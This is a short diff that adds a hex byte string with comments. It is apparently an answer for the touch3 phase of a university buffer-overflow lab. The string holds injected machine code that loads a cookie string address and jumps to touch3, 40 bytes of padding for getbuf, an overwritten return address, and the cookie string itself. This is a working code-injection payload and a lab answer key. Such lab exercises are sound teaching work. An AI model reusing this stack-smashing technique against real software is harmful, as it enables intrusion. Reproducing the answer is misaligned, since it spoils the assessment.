@@ -1,0 +1,11 @@
+48 c7 c7 a8 dc 61 55 	    /* mov $0x5561dca8,%rdi */
+68 fa 18 40 00              /* push touch3 address */
+c3                          /* ret */
+00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00     /* match 40 for getbuf */
+78 dc 61 55 00 00 00 00     /* address of getbuf */
+35 39 62 39 39 37 66 61 00  /* string "59b997fa" at test*/
+
+
